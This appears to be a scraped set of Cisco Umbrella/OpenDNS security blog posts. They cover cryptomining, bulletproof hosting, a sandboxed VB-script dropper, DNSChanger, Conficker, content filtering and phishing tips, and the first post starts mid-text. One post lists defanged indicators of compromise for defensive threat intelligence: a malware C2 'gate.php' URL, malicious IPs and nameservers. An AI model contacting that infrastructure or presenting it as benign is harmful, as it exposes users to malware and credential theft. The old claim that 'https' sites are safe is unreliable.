going on is challenging. Given that there are several different organizations that allow for anonymous mining, it can be hard to definitively say that a certain amount is being done. A quick search for domains utilizing Coinhive mining pools in top million domains using a service such as censys.io reveals nearly 1,000 domains currently actively mining Monero with the resources of their visitors. The same lookup for Crypto-Loot based mining reveals another hundred hosts monetizing their users. Most of the domains are streaming or torrent websites, where average users spend more time than the median of 1 minute and 50 seconds. We’ve observed an average of 250 visitors every hour to these domains. The torrent sites that have taken advantage of cryptominers are banking on the amount of visitors rather than the length of time spent there: Presence of CoinHive cryptominer or kickass[.]cd DNS requests per hour for kickass[.]cd as seen through Investigate Since less average time spent on a page equals a smaller amount of coins that can be mined, not all of the websites can utilize cryptomining scripts efficiently. In some cases, not so friendly scripts are used and your PC will keep mining even after you have left the page or closed the browser. Another malicious cryptojacking-related event took place earlier this month: cryptojacking of Argentinian Starbucks stores’ WIFI and the embedding cryptomining scripts in GitHub repositories . There’s Crypto In Them Thar Platforms As we have seen, the ability to embed the API calls has opened up new avenues of mining. Making the leap from browsers to apps shouldn’t be a total surprise, but with nearly 50 cryptomining apps legitimately in the Play Store for Android, it seems that we should expect to see more of these in the future. For apps that are found outside of normal distribution channels, or apps that do not disclose that they mine , this raises the question of what the appropriate security stance should be. By itself, cryptomining should not be seen as malicious. There’s no exfiltration of data or credentials as there are in phishing attacks, the user’s hardware and software is not changed or damaged in many cases, and both Coinhive and Crypto-Loot miners only tie up the resources involved in mining for as long as the browser window or tab is open. Once closed, those resources are returned to the computer. Those resources however, specifically the bandwidth and power costs, are much more impactful when applied to a mobile device rather than a home computer. In the US, mobile plans often have data caps and users are encouraged to use WiFi when possible. If an app is cryptomining on a cellular plan, end users could be quickly eating into their data caps and incurring extra charges from their cellular provider. Similarly, home computers draw on AC power, but the point of a mobile device is to be able to go with you without the need for cords. If an app on a phone is running in the background, the battery life will be severely diminished. Panning for Crypto To this end, Cisco Umbrella’s Security Research team classifies sites observed to be cryptominers as “potentially harmful”, an optional security setting for users of the Umbrella service. Because mining is not inherently malicious, we don’t believe that blocking the domains that host such services is the appropriate response. However, many domains which utilize cryptomining scripts do not disclose this to their users, and these miners benefit unknown entities. Domains which disclose their mining to their users through use of a CAPTCHA may have this security categorization changed. Claim Jumpers It’s a different story with software based cryptominers like Adylkuzz and cryptojacking. Adylkuzz is effectively a trojan that uses ETERNALBLUE and DOUBLEPULSAR to install cryptocurrency mining software on the infected system. For our purposes, cryptojacking is defined as the compromise or hacking of a website for purposes of placing a javascript miner without the owner’s knowledge. Such connections and domains are considered malicious and appropriately blocked as malware. The Next Gold Rush With cryptocurrency in the news more and more often these days, scrutiny and speculation are beginning to rise. What will happen in the next few years that might impact these emerging technologies and techniques? Two recent events point to a great deal more intervention from government. In Venezuela, the government recently announced that they would launch a cryptocurrency of its own called the “petro”. Like other cryptocurrencies, this one has been created to serve a need outside of what conventional currencies can serve. This need however is quite unique: to circumvent sanctions from nation-state partners such as the U.S. In America conversely, a new bill has been introduced that has some bitcoin traders worried about its overly broad language: S. 1241 takes aim at combating counterfeiting and money laundering, but undefined phrases like “digital currency” and expansive terms such as “No person shall knowingly conceal, falsify, or misrepresent, or attempt to conceal, falsify, or misrepresent, from or to a financial institution, a material fact concerning the ownership or control of an account or assets held in an account with a financial institution“ are a cause of concern for some. It’s impossible to say with accuracy where the future will take cryptocurrencies or cryptominers, but they’re almost certainly here to stay. As the internet continues to evolve in its third decade of existence, enterprising individuals will always be looking for the next motherlode, taking advantage of a landscape that others can’t see.", "date": "2017-12-19"},
{"website": "Cisco-Umbrella", "title": "Won't You Be My Neighbor?", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/wont-you-be-my-neighbor", "abstract": "A common metaphor for the Internet is that it’s divided into neighborhoods. If your website is hosted on an IP address and using nameservers that allow or encourage criminal activity, then you’re in a “ bad neighborhood “. Bad neighborhoods can exist because some hosting providers offer a space for criminals to set up domains to serve malicious content to visitors.  Under these circumstances, the hosting providers turn a blind eye as long as they are making money.  Another contributing factor that creates bad neighborhoods are compromised hosts used maliciously without the owners knowledge. We’re going to take a walk through one of these bad neighborhoods in this blog post. Enter at the Gate Our introduction to this neighborhood began when we were alerted to network communications with a URL ending in ‘gate.php’. URLs ending in ‘gate.php’ are indicative of default C2 URL configurations for multiple botnet families; ZeuS, Andromeda, and Pony downloader. Network communications: http://exportproducts[.]se/axump/gate[.]php Login panel This particular one looks to be AZORult. AZORult steals credential and credit card/payment information. Researchers have seen it involved in attack campaigns with Chthonic and Ramnit . Once we started to look at the infrastructure behind this, the nameservers stood out as suspicious. The nameservers are: ns1[.]steeldns[.]com and ns2[.]steeldns[.]com . A suspicious feature here is that the parent domain points to: localhost and 127.0.0.1. Cisco Umbrella Investigate showing IP Address information Furthermore, the TTL (Time To Live) change frequently on both nameservers; rotating between low-high values. DNS responses with low TTL values are indicative of Fast Flux botnets. In conjunction with compromised hosts acting as proxies, it creates a resilient command and control infrastructure. The multiple nodes or hosts within the network register and de-register their addresses as part of the DNS A record, changing the IP addresses. Each record has a very short TTL. This creates a constantly changing list of IP addresses for a domain name. This particular host is consistently changing to a low TTL, but not changing the IP address. It doesn’t appear they’re successfully utilizing a Fast Flux technique, but it’s enough to appear suspicious. Cisco Umbrella Investigate showing changing TTL A co-occurrence for ns1[.]steeldns[.]com is another nameserver ns2[.]metaldns[.]com. A co-occurrence is when two or more domains are being accessed by the same users within a small window of time. This top domain, metaldns[.]com is also pointed to localhost 127.0.0.1. Thanks to our passive DNS data, we have domain names that we’ve seen resolving to the IP addresses of these suspicious nameservers. The following are a few interesting sights seen in this neighborhood while crawling through the domains found. Lots of Open Space There are plenty of open directories that lead to various phishing pages and kits. Open directory for phishing pages Open directory of phishing pages and kits Open directory with phishing pages Phishing Pond If you continue down the walking path from the open space, you’ll make your way to the local phishing pond. Credential harvesting Impersonating https://www[.]alliancebank[.]com[.]my Multiple phishes Microsoft login phishing Information harvesting – showing email that receives data Have Some Crypto By now, you’re probably getting tired and ready to take a break with some crypto. Here’s some of what the neighborhood has to offer for cryptocurrency. OSINT gathered indicates this is a scam Just a Coinhive miner Site claims to exploit Bitcoin wallets and deliver the payouts to other people Need a Boost? There appears to be a large area devoted to Pharmaceutical fraud. Here are just a few. Pharma Fraud Steroid sales The Local Hangout End your day by meeting some of the locals. It looks like you’re being invited to check out the local’s Bullet Proof Hosting (BPH) located at ns1[.]666webhost[.]com and ns2[.]666webhost[.]com . At Cisco Umbrella, we see these neighborhoods of the Internet as hosting nothing but potential threats to our customers. We categorize them as Bulletproof Hosting, and have blocked all of the infrastructure highlighted above. IPs: 193[.]109[.]68[.]43 193[.]109[.]68[.]58 5[.]39[.]219[.]119 101[.]99[.]72[.]47 111[.]90[.]144[.]253 141[.]105[.]67[.]101 111[.]90[.]144[.]251 BPH Nameservers: ns1[.]steeldns[.]com ns2[.]steeldns[.]com ns1[.]metaldns[.]com ns2[.]metaldns[.]com ns1[.]666webhost[.]com ns2[.]666webhost[.]com", "date": "2018-02-02"},
{"website": "Cisco-Umbrella", "title": "Diamonds in the Rough", "author": ["Patrick Colford"], "link": "https://umbrella.cisco.com/blog/diamonds-in-the-rough", "abstract": "When threat hunting, it’s important to be thorough and not take things at first glance. With many free automated malware analysis and sandbox environments available, the barrier for threat analysis has been lowered. Though these products are excellent tools in the effort to combat malware, and while educating more users to take steps for their own security is always encouraged, the fact is that sometimes malicious artifacts can escape conviction. These type of products allow the upload of files and URLs and rely on a series of techniques and systems to evaluate the uploaded content. The techniques that these environments use vary, and may produce unexpected results while submitting things that are known to be malicious. One way to counteract this, is for users to work with the most discrete information available to them, the smallest thing they would like to evaluate, and go from there. This blog post will outline a scenario showing how isolating aspects of a malicious webpage for analysis led us down an exciting path of threat hunting. Lowest Common Denominator Our home-brewed NLP rank automates the detection and blocking of phishing domains very efficiently, based on the threshold we set during its training. However, some of the results wind up below our target score and Analysts get to do some manual analysis work. Usually this is due to a change in tactics, procedures, or code by the actors. One recent trend in crypto phishing is not just aiming at stealing users’ credentials but also infecting them with different Trojans. One example is a now removed site, idex[.]store. Posing as a cryptocurrency exchange, this domain when analyzed on VirusTotal at the time, displayed as benign. idex[.]store’s now removed page. Though the end of the page’s code contains a Visual Basic script designed to be a dropper… idex[.]store VB script VirusTotal did not convict the URL: VirusTotal fails to detect maliciousness. However when the VB script is run in isolation, VirusTotal returns a much different result: VB script analyzed in isolation. When working with a sandbox environment that has more granularity or features such as Threatgrid, this isolating strategy can become very powerful. Here we can see that Threatgrid has more information to reveal about the script, and that other anti-virus services have labeled this as a dropper at least, or Ramnit at worst: Theatgrid Analysis of VB script Now that we have more concrete evidence of maliciousness, we can begin to pivot as we normally would, finding further malicious domains. The IP addresses that idex[.]store last resolved to, and the one that it resolved to while it was still hosting the dropper are both leads to follow. idex[.]store’s observed IP addresses A second example found while pivoting from this IP address is a domain posing as electrum[.]org. This domain tries to trick users by providing download links to electrum wallets: Malicious domain posing as electrum wallet download site Binaries which are hosted at those links are trojanized and will steal and send user credentials to a malicious actor. They are recognized as malicious by both VirusTotal and Hybrid Analysis: Analysis of the binary downloaded from electrumwallet[.]ml Analysis of the binary downloaded from electrumwallet[.]ml The Rabbit Hole The first IP address, the one that idex[.]store originally used was 178.208[.]83.11. Only utilized for about a day, this IP address belongs to mchost[.]ru, a popular internet registrar and domain hosting service based in Russia. On this IP address are several other domains of various degrees of maliciousness, including several typo-squatting phishes of Bitfinex and Cryptojacking. The new IP addresses, 109.70.26[.]37 and 194.85.61[.]76 seem to be shared by a host of malicious domains. In addition to a typo squat of Vodafone and several obvious Apple phishes, there is a record of droppers and trojans calling back to their IPs as well as a history of spam-filled advertising networks. The cherry on this malicious cake includes Emotet hosts like this one. Given the nature of threat hunting, there could always be dead ends and failures. It’s important to listen to your instincts and to try to dig past suspected false results and misleading dead ends. Isolate the thing that interests you and don’t give up! At Cisco Umbrella our Analysts continually perform threat hunting activities to go along side our machine learning algorithms to continue to provide protection for our customers against the latest threats.", "date": "2018-07-10"},
{"website": "Cisco-Umbrella", "title": "Cisco Recognized in the March 2019 Gartner Peer Insights ‘Voice of the Customer’ for Secure Web Gateways", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/cisco-recognized-in-the-march-2019-gartner-peer-insights-voice-of-the-customer-for-secure-web-gateways", "abstract": "Back in January we kicked off 2019 with news of the announcement of our Jan. 2019 Gartner Peer Insights Customers’ Choice distinction. We are thrilled to share that Gartner has recently included Cisco in their first ever Gartner Peer Insights ‘Voice of the Customer’ report for the Secure Web Gateways (SWG) market for Cisco Umbrella . Gartner Peer Insights is a peer review and ratings platform designed for IT decision makers. The ‘Voice of the Customer’ report synthesizes Gartner Peer Insights’ content in the SWG market for 2018. As Gartner notes in granting this recognition, “this peer perspective, along with the individual detailed reviews, is complementary to expert research and should play a key role in the customer buying process.” In the report, Cisco received the highest overall rating with a 4.6 out of 5 in the SWG market, based on 85 reviews for Cisco, as of 31 December 2018. Umbrella protects users from connecting to malicious sites on the internet anywhere they go. With Umbrella, you can see threats before they launch, and block them before they become attacks. We are delighted to see our customers rating us highly on Gartner Peer Insights. In our view, we are always keeping a pulse on customer feedback and iterating to deliver the very best in everything we do — from product capabilities to customer support. From our perspective, this rating provides a level of validation directly from our customers! ‘Voice of the Customer’ SWG Report highlights: Cisco received the highest ratings in the report for both overall rating and product capabilities.* We also received the highest rating across evaluation and contracting, integration and deployment, and service and support.* We believe that these reviews are consistent with what we have been seeing across our own touchpoints with Umbrella customers. Here are a few highlights from a recent customer survey on Umbrella, conducted by TechValidate: After deploying Umbrella, 85% of respondents saw value within less than 1 week More than half of survey respondents saw a reduction in malware infections by 75% or more More than two-thirds of respondents stated that Umbrella helped to improve protection for remote workers and branch offices by 75% We believe these reviews tell a story that Umbrella is delivering exceptional value to customers. In our view, our Customers’ Choice distinction pushes us to continue the efforts that led to this recognition. Get a copy of the Gartner Peer Insights ‘Voice of the Customer’ SWG Report Download a complimentary copy of the report today for a full breakdown of SWG Peer Reviews and Ratings, vendor comparisons and reviewer demographics. As Gartner sites in the report, “ratings within Gartner Peer Insights can be a valuable source of lessons learned for those currently in the buying cycle for the SWG market, particularly if you can find and read reviews from end users like you (for example, those that share your technology adoption bias, company size, industry or geography).” To read Umbrella reviews written by the IT professionals who use it, please visit our Gartner Peer Insights page. If you’re ready to learn more about Umbrella and protect against threats, sign up for a free trial . Gartner, Gartner Peer Insights ‘Voice of the Customer’: Secure Web Gateways, Peer Contributors, 7 March 2019. *Among providers who were also named a Jan. 2019 Customers’ Choice for Secure Web Gateways. These graphics were published by Gartner, Inc. as part of a larger research document and should be evaluated in the context of the entire document. The Gartner document is available upon request from Cisco. Gartner Peer Insights Customers’ Choice constitute the subjective opinions of individual end-user reviews, ratings, and data applied against a documented methodology; they neither represent the views of, nor constitute an endorsement by, Gartner or its affiliates.", "date": "2019-05-15"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Datacenter Monitoring Station", "author": ["Dima Kumets"], "link": "https://umbrella.cisco.com/blog/opendns-datacenter-monitoring-station", "abstract": "OpenDNS turned 5 this year and I wanted to build something really cool to commemorate the occasion.  I wanted to make something that would look amazing, was functional and would make people think about just how much we have accomplished.  As a product manager I spend a lot of time looking at data visualizations but have always had a soft spot for old sci-fi war rooms and power stations with hundreds of physical analog gauges. Goals Design must have both vintage and contemporary elements. I love steampunk as much as the next guy but it just didn’t feel right for this project. Arduino driven.  It has been a year since my last Arduino project and it’s time to get back to my favorite little microcontroller. There are also a few other people playing with Arduinos at OpenDNS – not so many using picaxe or MSP 430s . Expandable – not everything has to be done at once but a little work now gets me more to play with later. I used RGB tri-color LEDs but only connected the red channel for the first iteration. Get others involved –  I work with brilliant software engineers.  If I provide them with instructions on how to send data to the panel over USB, they will do a much better job than I ever could. While this write up is about my work, it was awesome to work with engineers Doug Tabacco and Adam Phelps on this project. Parts Pre-finished Birch Plywood – cut to 18″x24″ pieces to fit on the laser bed. Arduino – I had an Arduino Mega sitting around but it’s overkill for what I need.  I need lots of PWM outputs and the Mega only has 13. TI TLC5940 LED Drivers – I daisy chained two of these chips to drive up 32 PWM/analog outputs. Each chip is about $4 and there is a good library with plenty of examples of Arduino+TLC5940. The one odd thing is that the 594o controls the individual cathodes (negative) so all the LEDs have to be common anode. 5mm common anode RGB Leds – I am only controlling the red channel with fading for now but will hook up the rest of the colors later to allow color changes. 0-5v gauges – the Arduino+TLC5940 can drive up to 5v which makes these voltmeter panel gauges  ideal.  I originally tested on a 0-1A gauge with the shunt cut off but having 12 identical gauges already set up for 5v made the project much simpler. Misc – a little bit of glue, some 22AWG wire, 22AWG butt crimps, tap splices and a breadboard. Map Laser etching can be done in one of two ways: Raster and vector.  While raster mode allows for fill and shading, vector mode etching cannot be beat for detail and sharpness.  Vector etching provides a 0.005″ (0.13mm) lines with curves rendered at 1200 dpi.   The trick is to run the vectors with #FF0000 line color at 100% speed, 10% power whereas the black vectors would cut at 20% speed, 90% power on a 60 Watt CO2 laser. The world map needed to vector etched but the original file ( http://www.vectorworldmap.com/ ) had every tiny little island as a barely visible vector form. In my test etching I found that the even with a laser cutter’s precision, there was heat spread in the wood causing charring! Sorry to our friends in Alaska and Western Europe but I had to hide some of the tiny islands. I found the locations of our data centers on the map and added mounting holes for the LEDs.  Since I am using nice 5mm RGB diffused LEDs, I wanted to show them off.  Instead of drilling a single big through hole for the LED body, I  decided to laser cut a hole for each lead (Red, Anode, Green, Blue). Each hole is 0.5mm in diameter with .75mm spacing between holes. This aligned the leads perfectly and snugly allowing me to attach wires from the back. Gauges The gauges are voltmeters that measure 0-5v DC. I originally planned on replacing the face of the gauges but the stock gauges looked so good I didn’t bother. The ambiguity of 0-5 only seemed to add to the overall effect. I used calipers to measure the gauges and design a mounting through hole for laser cutting into the wood.  I always test my designs by first laser cutting them into cardboard so I can find all the little flaws.  To my surprise, the first iteration was a perfect fit! Construction I have been playing with box joints for a little while and really like the contrast of laser charred edges against a  light birch face. I got my settings dialed in to the point that I was getting a dovetail-like fit. In fact the boxes you see here are incredibly hard to disassemble. For this project, I will be assembling and disassembling frequently so I adjusted my settings to make for a looser fit. The laser cutter at TechShop San Francisco has an 18″ x24″ bed.  This is a great size but scaling the world map  to fit in that space with enough room for two rows of gauges left New York and Washington DC so close together that the LEDs would be touching. I needed to scale up. Since I have 24″ on one end I decided to make the case 23″ x 23″ x 6″.  The 23″x6″ sides/top/bottom cut easily.  I then split the back into two pieces and the front into three pieces. By keeping the front modular, I was able to permanently glue the sides, top front and bottom front but allow the middle front and back to be removed.  Why leave that extra space in the middle?  I’m not sure yet but I think there may have to be some rocker switches, buttons and dials added to the panel in the future. Assembly and Wiring This picture pretty much tells it all.  The clamps were probably unnecessary since the finger joints were holding just fine but one can never be too careful. The only part missing from the shot is the Arduino that sits along the bottom along with a breadboard holding two TLC5940 chips. Notice the hole in bottom left for USB cord. Final Assembly Hot glue used to hold wires in place. I reversed colors (oops) and the common negative/cathode is black for the LEDs. Tiny butt crimp connectors attach the LED leads to the wires. You’ll also notice the red wire taps to attach common anode. Electrical tape is covering up the unused green and blue pins. Arduino and breadboard are attached to the bottom of the case using foam tape. I couldn’t be happier with how it turned out! The monitoring station now sits at the front of our office for everyone to see. Serial Communication The Arduino makes serial communication pretty simple. The two tricky parts are keeping the serial connection open and debugging.  I settled on the format of three digits and a character to indicate which location (LED+Gauge) was being updated.  For example, updating Amsterdam to 100% (gauge pinned at 5, LED glowing brightly)  send 100A or 050A for 50%. At this point, uber-engineer and friend Doug Tabacco took over and wrote the control software.  The laptop does all the heavy lifting of  fetching stats and scaling/normalizing. His python script scrapes the per-site stats data, normalizes it to a % value and sends that value over serial every 0.085 seconds. Bugs Everything seemed to be fine but then a strange thing happened: after a few minutes of testing, Doug’s Mac’s USB port stopped responding until it was rebooted.   I was starting to freak out because the Sysadmin Appreciation Day party was only 5 days away and this was more than just a little weird glitch. My first assumption was that there was something wrong with the Arduino.  Then after a good night’s sleep I realized I forgot to comment out one of my debug serial outputs in the Arduino code.  The Arduino was sending a line of serial output every .085 seconds (12 outputs per second)… yep, that’s how you fill a buffer and cause weird things to happen. After commenting out that output line in the Arduino code, Doug’s script worked perfectly!", "date": "2011-08-03"},
{"website": "Cisco-Umbrella", "title": "OpenDNS + CloudFlare == DNSChanger solution.  Or, how to not lose Internet on July 9", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-cloudflare-dnschanger-solution-or-how-to-not-lose-internet-on-july-9", "abstract": "It’s been said that DNSChanger is one of the most prolific malware attacks in history. At its peak it infected many millions of computers, belonging to people all around the world. It uses malicious DNS servers that automatically and involuntarily convert the DNS settings of infected computers, then uses that control to redirect valid URLs to malicious sites. So if you or someone you know is infected, you effectively have zero control over Internet navigation and can’t trust that the websites you’re visiting are legitimate. Some reports claim that more than half of the Fortune 500 companies showed signs of infection and it’s said that the Estonian crime ring operating DNSChanger profited $14 million in stolen funds. Law enforcement outsmarted the people behind DNSChanger and took over operation of the malicious servers late last year. After multiple extensions, they’ve announced a firm date of July 9 for when they’ll cease operation. On that date, the nearly half-million people still infected will not be able to connect to the Internet. And they’ll likely have no idea why. We recently put our heads together with our friends from Cloudflare to see how to better warn infected users that their Internet would effectively break on July 9th. While OpenDNS’s services reach individual Internet users in 1 in 3 U.S. public schools, Fortune 10 enterprises and hundreds of thousands of homes around the world, CloudFlare’s service secures and accelerates hundreds of thousands of websites. Recognizing we’re collectively in a unique and opportune position to both help get the word out and guide people safely over to OpenDNS’s secure, fast and reliable DNS servers, OpenDNS has partnered with CloudFlare to deliver a solution. Think of this as a sort of Internet “Emergency Broadcast System” that leverages CloudFlare’s large reach across the web to communicate a message to those infected with DNSChanger, and OpenDNS’ ability to help protect those users. Here’s how it works: Starting this morning at 8 a.m. Pacific time, people who are infected with DNSChanger visting a participating website will see a banner in their browser window that notifies them of the infection and points them to http://www.OpenDNS.com/dns-changer. On that page Internet users with infected computers will find instructions for disinfecting and removing DNSChanger and then switching to OpenDNS, or another safe DNS service of their choosing. Generally, you have two choices — you can use the DNS servers provided by your ISP (usually these DNS servers are assigned automatically) or use a third-party DNS service. ___________ Instructions for switching to OpenDNS are here . Communications efforts put forth thus far have reached many people, but failed to reach a significant number who still remain infected — nearly a half-million people. It’s also worth pointing out that the FBI should be commended for running the DNSChanger DNS servers for this long — they could have shut them down long ago. We’ve invested the resources in this effort because first and foremost, our mission is to deliver a better Internet. Not just to our tens of millions of users, but to the Internet at large. You can read CloudFlare’s blog post about this here: http://blog.cloudflare.com/cloudflare-opendns-work-together-to-save-the", "date": "2012-05-03"},
{"website": "Cisco-Umbrella", "title": "The role of government in content filtering", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/the-role-of-government-in-content-filtering", "abstract": "Confusion reigns over a new partnership between the UK government and the region’s largest ISPs. What we know is that Sky, British Telecom, TalkTalk and Virgin have teamed with Prime Minister David Cameron to make it easier for parents to block pornography. What we don’t know is whether filtering of pornographic websites will be on by default , with the option to be disabled, or off by default , with the option to be turned on. We also don’t know how, technically, the filtering will be executed. And related, how difficult it is to bypass. We don’t even know how “pornographic” will be defined. Even without knowing any of that, I can say with relative certainty that this is an idea that won’t work and shouldn’t be done. More on that in a moment, but first, a comment on how some people use OpenDNS. Something we don’t talk about often is the dual nature of OpenDNS’s benefit to our 30 million-plus customers around the world. While a good portion of those folks use OpenDNS to filter content and keep their kids safe online, many people in countries like Algeria, Egypt and Turkey use OpenDNS for an entirely different and even opposite reason. Those countries happen to be three of the top government-imposed Internet-censoring countries in the world and our customers who live there are often able to use our service to access the wide-open Internet. It allows them to quickly and easily bypass government-imposed filters that are done through the DNS. We fully support that and believe that people should control their own means of accessing the Internet. Back to this UK porn filtering idea. We believe filtering should happen at the edge . The edge means the “last mile” where your home or computer connects to the Internet, or where your office connects to the Internet. Doing filtering at the ISP level is what I would describe as “the core.” We don’t think ISPs or Government should mandate what you can and cannot access, nor should they modify or censor packets that leave your network. We’re thrilled to be the choice of millions of people who want to block malware, botnets, and sometimes even pornography on their network, but we would never want usage of OpenDNS to be mandated by the Government. We prefer when our customers choose us and when our customers set us up themselves. OpenDNS has become part of the discussion in the UK today because many have pointed out that we do what Cameron is trying to do with the new filter. There are important differences though. It’s true, OpenDNS can be enabled today in every household in the UK with children, empowering parents to block what they deem unsafe or inappropriate for their family. But OpenDNS can be configured differently for each household, as opposed to a blanket filter, which it appears is what is being proposed by the UK government. Our stance here is simple : We think parents should have the tools to keep their kids safe. For some parents that means having access to content filtering tools, but for other parents it just means a conversation with their kids. That’s a choice best left to parents, and we don’t think that any form of government intervention is appropriate here.", "date": "2011-10-12"},
{"website": "Cisco-Umbrella", "title": "How to Identify a Spear Phish", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/how-to-identify-a-spear-phish", "abstract": "Earlier this month, email marketing provider Epsilon announced that their database was hacked. Millions of email addresses were exposed thanks to this breach, and in the following days and weeks many of the companies that used Epsilon’s services — everyone from national banks to big hotel chains to online retailers — sent out emails to their customers alerting them about the vulnerability. What’s especially worrisome about Epsilon’s announcement is that it wasn’t only email addresses that were accessed. In some cases, names were also connected to these email addresses. With a name and an email address, there’s a high potential to be spear phished. What’s spear phishing? It’s a phish that’s especially targeted to you. Instead of a mass email sent to everyone on a scammers list, a spear phish is targeted to you directly. It might address you by name, for example, or even look like it’s sent from a friend or family member. Phishes of this type can be especially tricky to identify, but by taking some extra precaution you can outsmart these Internet scammers. Here’s what to look for: Forged link . Even if a link has a name you recognize somewhere in it, it doesn’t mean it links to the real organization. Roll your mouse over the link and see if it matches what appears in the email. If there is a discrepancy, don’t click on the link. Also, websites where it is safe to enter personal information begin with “https” — the “s” stands for secure. If you don’t see “https” do not proceed. Requests personal information. The point of sending phishing email is to trick you into providing your personal information. If you receive an email requesting your personal information, it is probably a phishing attempt. You can always check out their claim safely by heading to your bank’s website and calling them or emailing them directly. Sense of urgency . Internet criminals want you to provide your personal information now. They do this by making you think something has happened that requires you to act fast. The faster they get your information, the faster they can move on to another victim. Of course the absolute best thing you can do to protect yourself from phishing websites is to use OpenDNS. We block more than a half million phishing attempts each month for the people who use our services. Since not everyone is super tech savvy, make sure to set up OpenDNS for friends and family members who might not know how to do it themselves. If you do come across a phishing email, submit the phony website to PhishTank . Sharing information with the PhishTank community helps quickly distribute phishing data across a number of services , and makes the Internet safer for all of us who use OpenDNS.", "date": "2011-04-13"},
{"website": "Cisco-Umbrella", "title": "Proxies and Anonymizers: No Match for OpenDNS", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/proxies-and-anonymizers-no-match-for-opendns", "abstract": "A recent survey of IT Managers revealed that dealing with proxies and anonymizers — websites that allow users on a network to bypass Web content filtering that’s been set up — is a major headache: 87 percent of IT managers in education think proxies are a problem, followed by 56 percent in the private sector and 44 percent in the public sector. The same study revealed that IT Managers are spending almost 30 percent more time this year dealing with proxy sites than they did last year. We know (and you know) you’ve got better things to do with your time than deal with tracking down the latest proxies and anonymizers and manually blocking them. That’s why we’ve offered this as a built in feature for more than three years. Like all of OpenDNS’ Web content filtering categories, the Proxy/Anonymizer category is constantly updated, thanks to the Domain Tagging community’s hard work . To make sure you’re blocking proxies head to the dashboard, select your network and choose “Web Content Filtering.” From there, make sure to choose “Proxy/Anonymizer” as one of your categories to block. Once you do that, you can rest easy knowing what’s blocked on your network is blocked.", "date": "2010-09-14"},
{"website": "Cisco-Umbrella", "title": "The Risk is There: Researchers Connect Pornography and Malware", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/the-risk-is-there-researchers-connect-pornography-and-malware", "abstract": "At last week’s Workshop on the Economics of Information Security — an annual conference held at Harvard — new research (PDF) was presented showing the link between pornography and malicious online practices. When the study’s researchers surveyed adult websites, they found that many were aimed at “manipulating and misleading a visitor to perform actions that result in an economic profit” for the Web site. Free sites used these tactics 34 percent of the time, while paid sites used them 11 percent of the time. What types of tactics are we talking about? According to the study, methods include: Javascript catchers that hijack the user’s browser, making it difficult to leave a site. Blind and hidden links that prevent an address from being displayed in a web browser’s status bar. This can be used to mask malicious activities, like cross site scripting or cross site request forgery attempts. Redirection scripts that redirect users to different websites. This occurs on a server, so there’s no way for a user to know it might happen until they click. Malware that triggers malicious behavior including “code execution, registry changes, or executable downloads.” In addition to misleading activity, the level of malware found on adult Web sites was surprising to the researchers too; almost 3.5 percent of adult websites had this type of behavior, compared with previous studies that found less than one percent as malicious. Spyware and Trojan downloads were the most popular types of malware. The good news is, it’s simple to block adult content and pornography with OpenDNS. In a couple of steps, you can nip the issue in the bud by blocking content you know causes issues on your computer and network. To block adult content, navigate to the Settings page and select the network you wish to manage. You’ll then see a Choose Your Filtering Level option under Content Filtering. To block all adult content, make sure to block the following five categories: Adult themes, Nudity, Sexuality, Pornography, and Tasteless. Since we already block malware for all OpenDNS users (Enterprise users get more comprehensive coverage), blocking pornography is just one more step you can take to protect users on your network from coming in contact with malicious tactics online.", "date": "2010-06-15"},
{"website": "Cisco-Umbrella", "title": "Stats are back; and we're blocking Conficker", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/stats-are-back-and-conficker", "abstract": "Today we made two announcements, each very significant to all OpenDNS users. Here’s an overview to get everyone up to speed on what OpenDNS has cooked up. The first announcement is about the comeback – and improvement – of the much-loved and anticipated Stats System. Stats are invaluable to network administrators: they give you insight into what’s happening on your network coupled with the tools to do something about it. The old system, which was overloaded and barely processing our nearly 9 billions DNS queries per day, was down for awhile as we made improvements. Sometimes you have to take a step back in order to take three steps forward. Thanks to everyone for your patience as we got it back up and running. I hope you’ll find it was worth the wait. New functionality in the Stats System includes the comeback of the Top Domains report. This feature gives you a list of the top Web sites visited from your network and affords you unique insight into where your resources are being consumed, and which inappropriate or unsafe websites people are seeing. Top Domains now integrates directly with our Web content filtering system. This means you can look at Top Domains, see something you want blocked and block either the site or the category it fits into with a single click. (Example: Facebook.com is one of your Top Domains. Without leaving that screen you can block with Facebook.com or “Social Networks.”) The second announcement is significant to all OpenDNS users as well as the entire Internet community. Today we’ve rolled out a way for you to see if Conficker is living on your network. The Conficker worm, also called Downadup and Kido, is massive. Some estimates of how many PCs are compromised are as high as 10 million. What’s interesting about this particular virus is that it uses the Domain Name System in a unique way: Conficker contains an algorithm that checks 250 new domains per day for instructions on what it should do. This puts us in a unique position to keep you safe since we’re in the unique position of providing insight and intelligence into your DNS service. We’ve teamed with Kaspersky Lab to identify those 250 daily domains, and stop resolving them. This means if you’re using OpenDNS, Conficker will do your network no damage. Yet another reason for your friends and colleagues to make the switch. While OpenDNS represents just a tiny drop in the sea of the Internet users today, we think this is a smart move forward. To find out if Conficker has penetrated your network , simply log in to your account and select Stats on the left sidebar. From there choose Blocked Domains and filter “only domains blocked as malware.” This will generate a list of malware sites your network has attempted to connect with. This is just the beginning, folks. We’ve got a year’s worth of new features we’re cranking hard on to make your network better performing and more secure. Stay tuned…", "date": "2009-02-09"},
